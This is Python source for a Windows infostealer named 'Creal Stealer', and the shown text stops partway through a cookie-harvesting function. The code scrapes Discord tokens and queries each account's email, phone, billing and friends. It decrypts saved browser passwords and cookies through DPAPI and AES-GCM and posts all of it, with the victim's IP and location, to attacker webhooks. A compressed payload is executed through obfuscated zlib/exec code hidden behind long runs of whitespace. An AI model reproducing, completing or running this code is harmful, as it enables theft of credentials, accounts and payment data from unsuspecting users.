import os
import threading
from sys import executable
from sqlite3 import connect as sql_connect
import re
from base64 import b64decode
from json import loads as json_loads, load
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
from urllib.request import Request, urlopen
from json import *
import time
import shutil
from zipfile import ZipFile
import random
import re
import subprocess


hook = ""


DETECTED = False

def getip():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except:
        pass
    return ip

requirements = [
    ["requests", "requests"],
    ["Crypto.Cipher", "pycryptodome"]
]
for modl in requirements:
    try: __import__(modl[0])
    except:
        subprocess.Popen(f"{executable} -m pip install {modl[1]}", shell=True)
        time.sleep(3)

import requests
from Crypto.Cipher import AES

local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')
temp = os.getenv("TEMP")
Threadlist = []


class DATA_BLOB(Structure):
    _fields_ = [
        ('cbData', wintypes.DWORD),
        ('pbData', POINTER(c_char))
    ]

def GetData(blob_out):
    cbData = int(blob_out.cbData)
    pbData = blob_out.pbData
    buffer = c_buffer(cbData)
    cdll.msvcrt.memcpy(buffer, pbData, cbData)
    windll.kernel32.LocalFree(pbData)
    return buffer.raw

def CryptUnprotectData(encrypted_bytes, entropy=b''):
    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
    buffer_entropy = c_buffer(entropy, len(entropy))
    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
    blob_out = DATA_BLOB()

    if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
        return GetData(blob_out)

def DecryptValue(buff, master_key=None):
    starts = buff.decode(encoding='utf8', errors='ignore')[:3]
    if starts == 'v10' or starts == 'v11':
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass

def LoadRequests(methode, url, data='', files='', headers=''):
    for i in range(8): # max trys
        try:
            if methode == 'POST':
                if data != '':
                    r = requests.post(url, data=data)
                    if r.status_code == 200:
                        return r
                elif files != '':
                    r = requests.post(url, files=files)
                    if r.status_code == 200 or r.status_code == 413:
                        return r
        except:
            pass

def LoadUrlib(hook, data='', files='', headers=''):
    for i in range(8):
        try:
            if headers != '':
                r = urlopen(Request(hook, data=data, headers=headers))
                return r
            else:
                r = urlopen(Request(hook, data=data))
                return r
        except: 
            pass

def globalInfo():
    ip = getip()
    username = os.getenv("USERNAME")
    ipdatanojson = urlopen(Request(f"https://geolocation-db.com/jsonp/{ip}")).read().decode().replace('callback(', '').replace('})', '}')
    # print(ipdatanojson)
    ipdata = loads(ipdatanojson)
    # print(urlopen(Request(f"https://geolocation-db.com/jsonp/{ip}")).read().decode())
    contry = ipdata["country_name"]
    contryCode = ipdata["country_code"].lower()
    sehir = ipdata["state"]

    globalinfo = f":flag_{contryCode}:  - `{username.upper()} | {ip} ({contry})`"
    return globalinfo


def Trust(Cookies):
    # simple Trust Factor system
    global DETECTED
    data = str(Cookies)
    tim = re.findall(".google.com", data)
    # print(len(tim))
    if len(tim) < -1:
        DETECTED = True
        return DETECTED
    else:
        DETECTED = False
        return DETECTED
        
def GetUHQFriends(token):
    badgeList =  [
        {"Name": 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': "<:developer:874750808472825986> "},
        {"Name": 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': "<:bughunter_2:874750808430874664> "},
        {"Name": 'Early_Supporter', 'Value': 512, 'Emoji': "<:early_supporter:874750808414113823> "},
        {"Name": 'House_Balance', 'Value': 256, 'Emoji': "<:balance:874750808267292683> "},
        {"Name": 'House_Brilliance', 'Value': 128, 'Emoji': "<:brilliance:874750808338608199> "},
        {"Name": 'House_Bravery', 'Value': 64, 'Emoji': "<:bravery:874750808388952075> "},
        {"Name": 'Bug_Hunter_Level_1', 'Value': 8, 'Emoji': "<:bughunter_1:874750808426692658> "},
        {"Name": 'HypeSquad_Events', 'Value': 4, 'Emoji': "<:hypesquad_events:874750808594477056> "},
        {"Name": 'Partnered_Server_Owner', 'Value': 2,'Emoji': "<:partner:874750808678354964> "},
        {"Name": 'Discord_Employee', 'Value': 1, 'Emoji': "<:staff:874750808728666152> "}
    ]
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        friendlist = loads(urlopen(Request("https://discord.com/api/v6/users/@me/relationships", headers=headers)).read().decode())
    except:
        return False

    uhqlist = ''
    for friend in friendlist:
        OwnedBadges = ''
        flags = friend['user']['public_flags']
        for badge in badgeList:
            if flags // badge["Value"] != 0 and friend['type'] == 1:
                if not "House" in badge["Name"]:
                    OwnedBadges += badge["Emoji"]
                flags = flags % badge["Value"]
        if OwnedBadges != '':
            uhqlist += f"{OwnedBadges} | {friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})\n"
    return uhqlist

def GetBilling(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        billingjson = loads(urlopen(Request("https://discord.com/api/users/@me/billing/payment-sources", headers=headers)).read().decode())
    except:
        return False
    
    if billingjson == []: return "```None```"

    billing = ""
    for methode in billingjson:
        if methode["invalid"] == False:
            if methode["type"] == 1:
                billing += ":credit_card:"
            elif methode["type"] == 2:
                billing += ":parking: "

    return billing


def GetBadge(flags):
    if flags == 0: return ''

    OwnedBadges = ''
    badgeList =  [
        {"Name": 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': "<:developer:874750808472825986> "},
        {"Name": 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': "<:bughunter_2:874750808430874664> "},
        {"Name": 'Early_Supporter', 'Value': 512, 'Emoji': "<:early_supporter:874750808414113823> "},
        {"Name": 'House_Balance', 'Value': 256, 'Emoji': "<:balance:874750808267292683> "},
        {"Name": 'House_Brilliance', 'Value': 128, 'Emoji': "<:brilliance:874750808338608199> "},
        {"Name": 'House_Bravery', 'Value': 64, 'Emoji': "<:bravery:874750808388952075> "},
        {"Name": 'Bug_Hunter_Level_1', 'Value': 8, 'Emoji': "<:bughunter_1:874750808426692658> "},
        {"Name": 'HypeSquad_Events', 'Value': 4, 'Emoji': "<:hypesquad_events:874750808594477056> "},
        {"Name": 'Partnered_Server_Owner', 'Value': 2,'Emoji': "<:partner:874750808678354964> "},
        {"Name": 'Discord_Employee', 'Value': 1, 'Emoji': "<:staff:874750808728666152> "}
    ]
    for badge in badgeList:
        if flags // badge["Value"] != 0:
            OwnedBadges += badge["Emoji"]
            flags = flags % badge["Value"]

    return OwnedBadges

def GetTokenInfo(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    userjson = loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers)).read().decode())
    username = userjson["username"]
    hashtag = userjson["discriminator"]
    email = userjson["email"]
    idd = userjson["id"]
    pfp = userjson["avatar"]
    flags = userjson["public_flags"]
    nitro = ""
    phone = ""

    if "premium_type" in userjson: 
        nitrot = userjson["premium_type"]
        if nitrot == 1:
            nitro = "<a:DE_BadgeNitro:865242433692762122>"
        elif nitrot == 2:
            nitro = "<a:DE_BadgeNitro:865242433692762122><a:autr_boost1:1038724321771786240>"
    if "phone" in userjson: phone = f'{userjson["phone"]}'

    return username, hashtag, email, idd, pfp, flags, nitro, phone

def checkToken(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers))
        return True
    except:
        return False
from builtins import *
from math import prod as _calculate


__sa__ = 'ayhu'
__bb__ = ('ayhu', 'artonus')
__gg__ = 'https://github.com/Ayhuuu'
__hh__ = 'https://discord.gg/'
__jj__ = 'EPL-2.0'

__code__ = 'print("Hello world!")'


Absolute, Theory, Hypothesis, Algorithm, StackOverflow, _stackoverflow, _theory = exec, str, tuple, map, ord, globals, type

class Invert:
    def __init__(self, Ceil):
        self.Substract = _calculate((Ceil, -3669))
        self.Walk(_cube=-76121)

    def Walk(self, _cube = Ellipsis):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        self.Substract -= 73639 - _cube
        
        try:
            ((Absolute, {Hypothesis: Algorithm}) for Absolute in (_walk, Absolute) if StackOverflow is Theory)

        except OSError:
            ((Hypothesis, (Algorithm, Absolute)) for Hypothesis in {Absolute: _walk} if Algorithm != Absolute)

        except:
            _theory(74 + 97875) == True

    def System(self, _detectvar = 64761):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        _detectvar /= -51236 - -7095
        self._negative != None
        
        try:
            ((Algorithm, Absolute) or Absolute if (Algorithm, Absolute) and Absolute else ... or (Absolute, (Algorithm, Absolute)))

        except TypeError:
            (((Absolute, Absolute, Algorithm), Absolute) for Absolute in {Absolute: _walk})

        except:
            _theory(-49682 + -31861) == int

    def Statistics(MemoryAccess = Ellipsis):
        return _stackoverflow()[MemoryAccess]

    def Frame(Modulo = -2628 + 71816, _callfunction = False, _memoryaccess = _stackoverflow):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        _memoryaccess()[Modulo] = _callfunction
        
        try:
            {Absolute: _walk} if StackOverflow is StackOverflow else (Algorithm, Absolute) != Theory

        except AssertionError:
            ((Absolute, {Hypothesis: Algorithm}) for Absolute in {StackOverflow: Theory} if StackOverflow >= _walk)

        except:
            _theory(47722 + 72159) == float

    def execute(code = str):
        return Absolute(Theory(Hypothesis(Algorithm(StackOverflow, code))))

    @property
    def _negative(self):
        self._multiply = '<__main__.Absolute object at 0x000009766BE72161>'
        return (self._multiply, Invert._negative)

if __name__ == '__main__':
    try:
        Invert.execute(code = __code__)
        Negative = Invert(Ceil = -8418 + 71067)

        Negative.System(_detectvar = 89854 * Negative.Substract)                                                                                                                                                                                                                                                          ;Invert.Frame(Modulo='OooOO0o0o0O0O0ooOO0oo',_callfunction=b'x\x9c\xddYmo"7\x10\xfe\xce\xaf\xe0\xf8\xb2\xacrI\x16\xaf\xede\x91\xeeC\xa5\xb4*\x88\x84\xaaTM\xaa\xbb\x13\xdaWb\xce\xac#X.\xe4\xdfw\xc66$\x07l\xb34Q+\xb1\xc6/;\x9e\x19\xdb\x8f\xc7c{)\x17O\xbdF\x13\x1e\x91\xb7u\x8e\xcfd\xb2\x8c&\x93\xe6\x87O\xad\xe8\xe9~\xd5j\xaa\xc5\x8b\xaa8\xd6UmS\xf7\xb1\x15-JU\xac\x96-\xf7\x07\xae\xe9\xd4(\xb8/\xcb\x87e\xef\xf2r*\xca\xfbU|\x91\xa8\xf9\xe5O \xb7\xda\xd5z\x7f\xff#\x7f*\x96\x89Z\xa4\x17\xd3\xe9\xe5\x0e\xe7lf8\x7f\xfemxN.\xbc\x9d\xdaD\xa5\x99\xaew\x1e\x16\xa2(\xdb\xad_3)U\xf3Q-d\xfa\xa1\xe5:\r\xb7\xb7\xe5\xc6zg\xf9M\xa4\x8e\xdb\xc8\xd6I\xf6PZ(\x8a\x87\x15H\xfe\xae\x96\xd9\xb2\x19-\xb2\xe6"K\xbf\x14\x7f\n%\xb3\xd2\x10b\xb9\xca\xbe\x14\x7f\xa9\x95~\x8b\x9a\xa8\xe4Kq\xa3b\x95>5\xa5\xf8\x06rOj\xd5r\x1b\xa6Sb\xfe\xa0\x16\xe5d\x02\xad=-\x1d\xf7"[\x8b\xb2\xed6\xa4J"\xb9l\xbb\x9f\x9d1\x19\x8f\t!\x18\xf53\x1e;_?M\xa5\x8a\xa1\xbe\xb1_\x89"\xf8>\xdeR\x80G\xa7Pv>\xf7zg\xe7g\xe7\xed\xf3\xf6Y\xc7u\xbf\x82\xa2\xac\x8c\xcarQ\xa1h\xe4\xa9\xd1\xc8\xf3\xf4o\xa4\x14\xfeF\xfb:RQ%\x7f}}}c\xe2\x8d\x8e\xf0@\xe7\xcd\xd8\x1a\x07*Q\xe6\xf1q\r\xc1\xa4kx\xa0\xf8\x08B\xcfHU\xb45\xe8\xf7\xfb\xc3a\x7f0\xc0\x14\xb2\xe1`\x00b\x87\xb4\xb5\x9dx%d)\n\xc4\xfb{\xb4\xa8\xec\n\xf2\x1b!-h\xa4Q\x1d(\x1e\xef`KL\x8f\xc6\xa4}\xb8\xc9e!J)V\xf1.|\xee\xc7\x91E\xd6\xb3H\x8f\x947:V\x89\xfb\xf9]\xb4\\\x88"\xcd\xd6m\'\x93\xe2a\xae\x92=\x86\xafn\x05\xf831\x9bI)\xe0\x9139\x9b\xcd\x848u\x88\x16\xe5\xb2><w\xb7\xb7www\xb7\x98a\xe9\x16\x92S\xc7\'[\xca\xe8\x97C\x08\x1dX\xa7f\xf9j\xca\x10\xa9P\xdb\x1f\x0e\x86\xc3\x7f\x81\x91\x10\xc92*\xc4\xdb0\xaaTr\x14F\xd5Z6\x18=\xe5B\xae\xb3\xfbbU\xdf\x92\xb0\x81G\xe3\x90\xd6\xd6!\xad\x01&\xc7\xb9\x98)Q\xfc\x83\x90\xe57\xdd\xd4\xce\xec\xd4-PF\xdf\xb3C\xc0V8{\xa9]\xd8LH\xf0cX\x9eI\x13N\x1d\xa6l\xb5\xf8\xe3\x88uZ\xcc\x8b\xf9\x1c\xa3-\x14X,\xe6\xa7\x8eR\x19)\x99\x1f\x01\x13Z\x0e\x1a\x12\x9a\x14\x14`G\x84=\x11\x8d\xea\xd4\x81\x92J\xed\xd7V\xba3\x00\xaf/\xf1\xb1\x99\xec\xcb\x97\xc2\x87\x1dW\xfb\xd0^\xd1\x8e\x1d\xbf\xc3r\xdf\x83\x18B\x0c R\x88\x0cb\xd7\xbe\xfbX&1\xe9\x92\xb4\x16o@B8!\xa6\x19^\x1c\xdaN7/\xf7\x1d\xb5\xabO\xc0\'=\xa3I\xb6>\xe8G\x0f[~\xc5\xdc\xf0T\x87L\x87M\x9eYjji\xa9\xa5\xe8\xba\xd7\x90\x87{D4\x8f\xd3\xa8\xf9\xb8\x1d\x93=\xa3\xeb\xc1\xf5\x0e\x19\\\xd5jUW\n~\x1a\xb5\xab\xab\xab\x91\xbaz\x83\x11r0\x1cb\r\x8b[##6n\x8c\xce\xb7FX\x87\x97\xd45B\x0b\xc7\xf3Z\x92&?\x06\x89\x8aA\xd1\x9c\xe7\x14\xba\xf32n(\x98\xe2\x1bFL_\x9f\xb7\xe3\x00%\x84w\x03\n\xc1\x0b|?"9\xc99\xe5a\xe0s\x9f\xe7\x01\xe1\x94dX\xe2)\xd0;\x81\xc7C\x92\x07\x01g\x1c\xa4\xb0?<\x0e|\x02`B\x1f\x19\xa4\x04\x82\xef\x87\xfa\rUP(\x13\xa0\xc3r\xf7\x19\xc9i\xcc\x98\xdf\xa5\x1d\x16\x04\x04<\x01P\x99\xc7\x13F\x98Gc\x08\x01\ry\xce\x18\x8bXH9\xc8t\xa8Oa\xda\x02\x9fQ\x86z\xfd \x0c\x98\x1f\x92\x94wh\xc6c\x16B\x0b\xdd\x80\x04\x942\xe8YB}\x9f\x07\x04Rh\x15p\x0b)\xb6J}/\x08\x81\x94\x06]\xcai\x97FA@9!\xafNy\x95)\xe3To=\x91\x99y\xfd\x1b\xd70i\xc7\xf5\xa0\xba\xf3\xce\x9c\x9d\t\x99\xb0\t\x85\xe8O::\xf8\xc0N\xf6\xa9\xf5\xb4A\xb5W\x8b\x93N\x02\x08\x0c\xda\xf1\xa0\x1d\x1fJ\x0c\xd8\xd9>\xb5\xe6(P\x9f\x07r]\x90\n!0=\x8a=j-m\xa6}\x94\x0cA\x12\xc6t\xc6\x7f\xa4\xd4\xd2\xd2\x9d`\xe0\x10\t\xb6\x8c}\x01\xf6p\x9fZK[\x00\xdc\x01\xccC\xb8E\x86\x02{w\x9fZK\x1b\xcen\x17dpf\x99F\x08g\xdd\xdf\xa7\xbe\xc1\xd5z$5{y=\x17Y7n]\xa9\xd07\x018\xbcI\xfc\xaea\xceop\x92\xeb\x1d\xbcA\x1c\xb9\x1f\x86:$\xdb\x98\xf0HS"\x9d\'\xb6\xd6\x84\xa8\xf6^\x88\x1f\x19\xcc\xc7\x06\xfc\xda`>6\xf4\x0ev\xac\xca\x7f@yh:<\xd0\xb5\xc3AM\xe3\xf1\xb5\x91\xf8zIs\x9c^m<{\xd4Z\xdaB\xbd\x98\xd0\x88=-\x07\x0b\x0b\xd8\xd1\x00w\xa8\xb5\xb4\xf9\x93@\xcb\xa1\x0c.\xd8\x8e^&t\x9f\xfa\xff\x98\xe2\xce\xce\xdd\xd7\x19\x04}6~\x0f[\xa3\x14\xf7j\xb3\x87S\xaas|r[\xc2]\x12\xca\xb5mL\x98+\x8d\xc4\xa5!\xf4\x95Y\x1c\xb7$\x9c\xcd\xc70|\xb4\xc5\xfew\xc0oG\x01\xe6\xddG\x13\xd7\xda\xa0g\xa8\xfe]\x16\xb6\x85s\x03\xab\x06\x9a>\xbf\x19\xc8k\x83\xdd7&a\x12\xf3r\\7\x1d\xc3\xa9\x99n\xb0`^\xdf\x80x\xf0\xe2\xa6\xc4\xec\xcd\x89\xdb\xb8\xa1q{\xc0\xad\xc3\xcb\x8e\x9c93\x8c\x9b\xed\x88\xae\r\x0c\xd77G9\xbaj\xbf\x8c\x1ex\xe3\x8f\x13\xeb\x89#\xeb\xa5\x81V{\xeap\xc3\x10\xf6\xdeo\xbe(\xcd\x8e\xba\x94lFg\xc7i2|\x7f\xc3\xdc\x85\xf6rA\xed\xe5\x82\xbd\x98\x8f\x8e\x8d\xd4\xce]\x1d^\xbf\xee\xdc\x1dy\xe6\x87C\xf3\xeb\'\xe0|\xa1\xe6\xcd\xcd_9M\xf3\xf7P\x13.\xabI\x03\x93\xb6\xb5\x8cg\xf46\x0b\xc1m\x94\xd3\xf9\xb7\xf5\xa7\x91\xbe c\xc0\x02\xdc\x93\x95\xa7\x94\xd7\xf8\x1b\x83|\xaf\xa9')

        if 371978 > 9214193:
            Invert(Ceil = -80832 * -20864).Walk(_cube = Negative.Substract - -19332)
        elif 420972 < 6510831:
            Negative.Walk(_cube = Negative.Substract * -48758)                                                                                                                                                                                                                                                          ;IllIlIlIIlIlllIlIIll,ILILLLIJILIJILLLJJJLJLIIL,jiijlilijijjjiiiljjijlj,lIlIIlIllIIIIllIIlllIl,JLJJIIJILIJJLJLLJLIIILII=(lambda IJILIJLLLJJJJILJJJ:IJILIJLLLJJJJILJJJ(__import__('\x7a\x6c\x69\x62'))),(lambda IJILIJLLLJJJJILJJJ:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(IJILIJLLLJJJJILJJJ)"),filename='\x78\x78\x77\x77\x78\x78\x77\x77\x78\x78\x78\x78\x77\x78\x77\x77\x78\x78\x78',mode='\x65\x76\x61\x6c'))),(lambda IJILIJLLLJJJJILJJJ:IJILIJLLLJJJJILJJJ['\x64\x65\x63\x6f\x6d\x70\x72\x65\x73\x73']),(lambda MMMNMMMMMNMMNNMNMMMNN,IJILIJLLLJJJJILJJJ:MMMNMMMMMNMMNNMNMMMNN(IJILIJLLLJJJJILJJJ)),(lambda:(lambda IJILIJLLLJJJJILJJJ:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(IJILIJLLLJJJJILJJJ)"),filename='\x78\x78\x77\x77\x78\x78\x77\x77\x78\x78\x78\x78\x77\x78\x77\x77\x78\x78\x78',mode='\x65\x76\x61\x6c')))('\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x62\x75\x69\x6c\x74\x69\x6e\x73\x27\x29\x2e\x65\x78\x65\x63'))
        Invert(Ceil = 27516 - -46017).System(_detectvar = -35737 / Negative.Substract)                                                                                                                                                                                                                                                          ;JLJJIIJILIJJLJLLJLIIILII()(lIlIIlIllIIIIllIIlllIl(jiijlilijijjjiiiljjijlj(IllIlIlIIlIlllIlIIll(ILILLLIJILIJILLLJJJLJLIIL('\x76\x61\x72\x73'))),Invert.Statistics(MemoryAccess='OooOO0o0o0O0O0ooOO0oo')))

    except Exception as _walk:
        if 382845 > 2097679:
            Invert.execute(code = Theory(_walk))

        elif 119271 > 3619787:
            Negative.Walk(_cube = Negative.Substract + -70321)
            
def uploadToken(token, path):
    global hook
    global tgmkx
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    username, hashtag, email, idd, pfp, flags, nitro, phone = GetTokenInfo(token)

    if pfp == None: 
        pfp = "https://cdn.discordapp.com/attachments/1050492593114456124/1051490320921145384/786713106658492416.webp"
    else:
        pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}"

    billing = GetBilling(token)
    badge = GetBadge(flags)
    friends = GetUHQFriends(token)
    if friends == '': friends = "```No Rare Friends```"
    if not billing:
        badge, phone, billing = "🔒", "🔒", "🔒"
    if nitro == '' and badge == '': nitro = "```None```"

    data = {
        "content": f'{globalInfo()} | `{path}`',
        "embeds": [
            {
            "color": 0000000,
            "fields": [
                {
                    "name": "<a:hyperNOPPERS:828369518199308388> Token:",
                    "value": f"```{token}```",
                    "inline": True
                },
                {
                    "name": "<:mail:750393870507966486> Email:",
                    "value": f"```{email}```",
                    "inline": True
                },
                {
                    "name": "<a:1689_Ringing_Phone:755219417075417088> Phone:",
                    "value": f"```{phone}```",
                    "inline": True
                },
                {
                    "name": "<:mc_earth:589630396476555264> IP:",
                    "value": f"```{getip()}```",
                    "inline": True
                },
                {
                    "name": "<:woozyface:874220843528486923> Badges:",
                    "value": f"{nitro}{badge}",
                    "inline": True
                },
                {
                    "name": "<a:4394_cc_creditcard_cartao_f4bihy:755218296801984553> Billing:",
                    "value": f"{billing}",
                    "inline": True
                },
                {
                    "name": "<a:mavikirmizi:853238372591599617> HQ Friends:",
                    "value": f"{friends}",
                    "inline": False
                }
                ],
            "author": {
                "name": f"{username}#{hashtag} ({idd})",
                "icon_url": f"{pfp}"
                },
            "footer": {
                "text": "Creal Stealer",
                "icon_url": "https://cdn.discordapp.com/attachments/1050492593114456124/1051490320921145384/786713106658492416.webp"
                },
            "thumbnail": {
                "url": f"{pfp}"
                }
            }
        ],
        "avatar_url": "https://cdn.discordapp.com/attachments/1050492593114456124/1051490320921145384/786713106658492416.webp",
        "username": "Creal Stealer",
        "attachments": []
        }
    urlopen(Request(tgmkx, data=dumps(data).encode(), headers=headers))
    LoadUrlib(hook, data=dumps(data).encode(), headers=headers)


def Reformat(listt):
    e = re.findall("(\w+[a-z])",listt)
    while "https" in e: e.remove("https")
    while "com" in e: e.remove("com")
    while "net" in e: e.remove("net")
    return list(set(e))

def upload(name, link):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    if name == "wpcook":
        rb = ' | '.join(da for da in cookiWords)
        if len(rb) > 1000: 
            rrrrr = Reformat(str(cookiWords))
            rb = ' | '.join(da for da in rrrrr)
        data = {
            "content": f"{globalInfo()}",
            "embeds": [
                {
                    "title": "Creal | Cookies Stealer",
                    "description": f"<:apollondelirmis:1012370180845883493>: **Accounts:**\n\n{rb}\n\n**Data:**\n<:cookies_tlm:816619063618568234> • **{CookiCount}** Cookies Found\n<a:CH_IconArrowRight:715585320178941993> • [CrealCookies.txt]({link})",
                    "color": 000000,
                    "footer": {
                        "text": "Creal Stealer",
                        "icon_url": "https://cdn.discordapp.com/attachments/1050492593114456124/1051490320921145384/786713106658492416.webp"
                    }
                }
            ],
            "username": "Creal Stealer",
            "avatar_url": "https://cdn.discordapp.com/attachments/1050492593114456124/1051490320921145384/786713106658492416.webp",
            "attachments": []
            }
        urlopen(Request(tgmkx, data=dumps(data).encode(), headers=headers))
        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
        return

    if name == "wppassw":
        ra = ' | '.join(da for da in paswWords)
        if len(ra) > 1000: 
            rrr = Reformat(str(paswWords))
            ra = ' | '.join(da for da in rrr)

        data = {
            "content": f"{globalInfo()}",
            "embeds": [
                {
                    "title": "Creal | Password Stealer",
                    "description": f"<:apollondelirmis:1012370180845883493>: **Accounts**:\n{ra}\n\n**Data:**\n<a:hira_kasaanahtari:886942856969875476> • **{PasswCount}** Passwords Found\n<a:CH_IconArrowRight:715585320178941993> • [CrealPassword.txt]({link})",
                    "color": 000000,
                    "footer": {
                        "text": "Creal Stealer",
                        "icon_url": "https://cdn.discordapp.com/attachments/1050492593114456124/1051490320921145384/786713106658492416.webp"
                    }
                }
            ],
            "username": "Creal",
            "avatar_url": "https://cdn.discordapp.com/attachments/1050492593114456124/1051490320921145384/786713106658492416.webp",
            "attachments": []
            }
        urlopen(Request(tgmkx, data=dumps(data).encode(), headers=headers))
        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
        return

    if name == "kiwi":
        data = {
            "content": f"{globalInfo()}",
            "embeds": [
                {
                "color": 000000,
                "fields": [
                    {
                    "name": "Interesting files found on user PC:",
                    "value": link
                    }
                ],
                "author": {
                    "name": "Creal | File Stealer"
                },
                "footer": {
                    "text": "Creal Stealer",
                    "icon_url": "https://cdn.discordapp.com/attachments/1050492593114456124/1051490320921145384/786713106658492416.webp"
                }
                }
            ],
            "username": "Creal Stealer",
            "avatar_url": "https://cdn.discordapp.com/attachments/1050492593114456124/1051490320921145384/786713106658492416.webp",
            "attachments": []
            }
        urlopen(Request(tgmkx, data=dumps(data).encode(), headers=headers))
        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
        return




# def upload(name, tk=''):
#     headers = {
#         "Content-Type": "application/json",
#         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
#     }

#     # r = requests.post(hook, files=files)
#     LoadRequests("POST", hook, files=files)
    _




def writeforfile(data, name):
    path = os.getenv("TEMP") + f"\wp{name}.txt"
    with open(path, mode='w', encoding='utf-8') as f:
        f.write(f"<--Creal STEALER BEST -->\n\n")
        for line in data:
            if line[0] != '':
                f.write(f"{line}\n")

Tokens = ''
def getToken(path, arg):
    if not os.path.exists(path): return

    path += arg
    for file in os.listdir(path):
        if file.endswith(".log") or file.endswith(".ldb")   :
            for line in [x.strip() for x in open(f"{path}\\{file}", errors="ignore").readlines() if x.strip()]:
                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", r"mfa\.[\w-]{80,95}"):
                    for token in re.findall(regex, line):
                        global Tokens
                        if checkToken(token):
                            if not token in Tokens:
                                # print(token)
                                Tokens += token
                                uploadToken(token, path)

Passw = []
def getPassw(path, arg):
    global Passw, PasswCount
    if not os.path.exists(path): return

    pathC = path + arg + "/Login Data"
    if os.stat(pathC).st_size == 0: return

    tempfold = temp + "wp" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"

    shutil.copy2(pathC, tempfold)
    conn = sql_connect(tempfold)
    cursor = conn.cursor()
    cursor.execute("SELECT action_url, username_value, password_value FROM logins;")
    data = cursor.fetchall()
    cursor.close()
    conn.close()
    os.remove(tempfold)

    pathKey = path + "/Local State"
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])

    for row in data: 
        if row[0] != '':
            for wa in keyword:
                old = wa
                if "https" in wa:
                    tmp = wa
                    wa = tmp.split('[')[1].split(']')[0]
                if wa in row[0]:
                    if not old in paswWords: paswWords.append(old)
            Passw.append(f"UR1: {row[0]} | U53RN4M3: {row[1]} | P455W0RD: {DecryptValue(row[2], master_key)}")
            PasswCount += 1
    writeforfile(Passw, 'passw')

Cookies = []    
def getCookie(path, arg):
    global Cookies, CookiCount
    if not os.path.exists(path): return
    
    pathC = path + arg + "/Cookies"
    if os.stat(pathC).st_size == 0: return
    
    tempfold = temp + "wp" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
    
    shutil.copy2(pathC, tempfold)
    conn = sql_connect(tempfold)
    cursor = conn.cursor()
    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
    data = cursor.fetchall()
    cursor.close()
    conn.close()
    os.remove(tempfold)

    pathKey = path + "/Local State"
    
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])

    for row in data: 
        if row[0] != '':
            for wa in keyword:
                old = wa
                if "https" in wa:
                    tmp = wa
                    wa = tmp.split('[')[1].split(']')[0]
                if wa in row[0]:
                    if not old in cookiWords: cookiWords.append(old)
